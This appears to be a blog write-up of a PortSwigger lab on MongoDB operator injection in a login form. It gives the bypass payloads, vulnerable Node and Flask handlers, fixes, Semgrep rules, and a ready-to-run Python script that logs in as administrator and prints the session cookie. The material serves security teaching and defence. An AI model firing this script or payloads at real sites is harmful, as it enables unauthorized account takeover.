---
title: "Lab 02: Exploiting NoSQL operator injection to bypass authentication"
date: 2026-01-27
categories: [portswigger, NoSQL_injection] 
tags: [nosql, monngodb, injection]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab2_api_testing/
---

## 1. Executive Summary

**Vulnerability:** NoSQL Operator Injection.

**Description:** The login mechanism accepts JSON input and passes it directly to a MongoDB query without sanitization. In MongoDB, query criteria are JSON objects. If an attacker submits a JSON object (like `{"$ne": ""}`) instead of a simple string for the password field, the database interprets it as a command ("Password does not equal empty string") rather than a literal value.

**Impact:** Authentication Bypass. An attacker can log in as any user, including the administrator, without knowing their password by crafting a query that is always true.

## 2. The Attack

**Objective:** Log in as `administrator` by bypassing the password check.

1. **Reconnaissance (Testing for Injection):**
    - I intercepted the login request using Burp Suite.
    - I modified the `username` field to `{"$ne": ""}` (Not Equal to empty string).
    - The server accepted this and logged me in (likely as the first user in the database). This confirmed the server processes MongoDB operators injected via JSON.
2. **Targeting the Admin:**
    - I changed the `username` to `{"$regex": "admin.*"}`. This asks the database for any username starting with "admin".
    - I changed the `password` to `{"$ne": ""}`. This asks the database to match any password that is not empty (effectively bypassing the check).
    - **Payload:**JSON
        
        `{
            "username": {"$regex": "admin.*"},
            "password": {"$ne": ""}
        }`
        
3. **Result:** The server constructed a query finding a user where the username matches "admin..." and the password exists. I was successfully logged in as the administrator.

---

## 3. Code Review

### Node.js (Express + MongoDB)

```jsx
app.post('/login', (req, res) => {
    // VULNERABLE: req.body is passed directly to the query
    const query = {
        username: req.body.username,
        password: req.body.password
    };

    db.collection('users').findOne(query, (err, user) => {
        if (user) {
            return res.json({ token: user.token });
        }
        return res.status(401).send('Invalid login');
    });
});
```

**Technical Flow & Syntax Explanation:**

- **`req.body.username`**: In Express (with `body-parser`), if the client sends a JSON payload like `{"username": {"$ne": null}}`, `req.body.username` becomes the *object* `{"$ne": null}`.
- **`db.collection('users').findOne(query)`**: The MongoDB driver accepts this object structure naturally. It doesn't know that `{"$ne": null}` was supposed to be a string. It interprets the `$` prefix as a special operator.
- **The Logic Flaw**: The application assumes input will always be simple strings (Values) and fails to anticipate Objects (Operators).

### Python (Flask + PyMongo)

```python
@app.route('/login', methods=['POST'])
def login():
    # VULNERABLE: Direct usage of JSON input
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # If 'password' is the dictionary {'$ne': ''}, MongoDB executes the operator
    user = db.users.find_one({
        "username": username,
        "password": password
    })

    if user:
        return jsonify({"token": user['token']})
    return "Invalid credentials", 401
```

**Technical Flow & Syntax Explanation:**

- **`request.get_json()`**: This parses the incoming JSON body into a native Python dictionary.
- **`find_one(...)`**: PyMongo passes the dictionary structure directly to the database engine. If `password` is `{"$ne": ""}`, the query effectively becomes "Find user where password is NOT empty," which is true for everyone.

### Mock PR Comment

The login endpoint accepts arbitrary JSON objects for `username` and `password`. This allows attackers to inject MongoDB operators like `$ne` to bypass authentication.

**Recommendation:** Sanitize the input to ensure `username` and `password` are strictly strings before passing them to the database query.

---

## 4. The Fix

**Explanation of the Fix:**
We must enforce type checking. Before using the input in a query, we explicitly convert it to a string or validate that it is not an object. This effectively "neutralizes" the operator by treating it as a literal string value (e.g., looking for a password literally named `[object Object]`).

### Secure Node.js

```jsx
const mongoSanitize = require('mongo-sanitize');

app.post('/login', (req, res) => {
    // SECURE: Strip keys starting with '$'
    const username = mongoSanitize(req.body.username);
    const password = mongoSanitize(req.body.password);

    // ALTERNATIVE: Explicit String Casting
    // const username = req.body.username.toString();

    const query = {
        username: username,
        password: password
    };

    db.collection('users').findOne(query, (err, user) => {
        // ...
    });
});
```

**Technical Flow & Syntax Explanation:**

- **`mongo-sanitize`**: This is a popular library that recurses through the input object and removes any keys that start with `$`.
- **Result**: If the attacker sends `{"$ne": ""}`, the sanitizer strips the key, leaving an empty object or null, which fails the authentication safely (or simply doesn't match the valid password hash).

### Secure Python

```python
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    
    # SECURE: Enforce type string. 
    # If input is a dict/object, this forces it to string representation or fails.
    username = str(data.get('username'))
    password = str(data.get('password'))

    user = db.users.find_one({
        "username": username,
        "password": password
    })
    # ...
```

**Technical Flow & Syntax Explanation:**

- **`str(...)`**: By forcing the input to be a string, an injected dictionary `{"$ne": ""}` becomes the string literal `"{'$ne': ''}"`.
- **Safe Query**: MongoDB looks for a password that literally matches that string characters, which will obviously fail, preventing the bypass.

---

## 5. Automation

*A Python script that sends the JSON injection payload to log in as admin.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_nosql_auth_bypass(url):
    login_url = f"{url.rstrip('/')}/login"
    
    # Payload: Username is "admin" (via regex), Password is NOT empty
    payload = {
        "username": {"$regex": "admin.*"},
        "password": {"$ne": ""}
    }
    
    # Must send as JSON, not data (form-urlencoded won't support nested dicts easily)
    headers = {'Content-Type': 'application/json'}
    
    print(f"[*] Targeting: {login_url}")
    print(f"[*] Sending NoSQL Injection Payload: {payload}")
    
    try:
        # requests.post(..., json=payload) automatically sets Content-Type
        resp = requests.post(login_url, json=payload, allow_redirects=False)
        
        # Check for success (Redirect or Session Cookie)
        if resp.status_code == 302 or "session" in resp.cookies:
            print("[!!!] SUCCESS: Admin Login Bypass Successful.")
            if "session" in resp.cookies:
                print(f"[+] Session Cookie: {resp.cookies.get('session')}")
            if "Location" in resp.headers:
                print(f"[+] Redirect Location: {resp.headers['Location']}")
        elif resp.status_code == 200 and "Invalid" not in resp.text:
             # Sometimes it returns 200 OK with the dashboard
             print("[+] Potential Success (200 OK). Check response.")
        else:
            print(f"[-] Failed. Status: {resp.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    args = ap.parse_args()

    exploit_nosql_auth_bypass(args.url)

if __name__ == "__main__":
    main()
```

---

## 6. Static Analysis (Semgrep)

### Node.js/JavaScript Rule

```yaml
rules:
  - id: javascript-express-nosql-injection
    languages: [javascript, typescript]
    message: |
      User input from 'req.body' is passed directly to a MongoDB query.
      This allows NoSQL Operator Injection. 
      Use 'mongo-sanitize' or coerce input to string.
    severity: ERROR
    patterns:
      - pattern-inside: |
          app.$METHOD(..., function(req, res) { ... })
      - pattern: |
          $DB.findOne({ $KEY: req.body.$INPUT })
      - pattern-not: |
          $DB.findOne({ $KEY: req.body.$INPUT.toString() })
```

**Technical Flow & Syntax Explanation:**

- **`pattern-inside`**: Limits the search to Express route handlers.
- **`$DB.findOne`**: Looks for MongoDB query functions.
- **`req.body.$INPUT`**: Identifies direct usage of the request body (which can be an object) as a query value.
- **`pattern-not`**: Ignores cases where the developer has manually converted the input to a string (`.toString()`), as this prevents the injection.

### Python Rule

```yaml
rules:
  - id: python-pymongo-nosql-injection
    languages: [python]
    message: "Direct use of request data in PyMongo query allows Operator Injection."
    severity: ERROR
    patterns:
      - pattern-inside: |
          @app.route(...)
          def $FUNC(...):
              ...
      - pattern: |
          $DB.find_one({..., $KEY: request.get_json().get(...), ...})
```

**Technical Flow & Syntax Explanation:**

- **`request.get_json().get(...)`**: Flags data retrieval that preserves dictionary structures (unlike `request.form` which is usually flat).
- **`$DB.find_one(...)`**: Detects the database call using that raw structure.
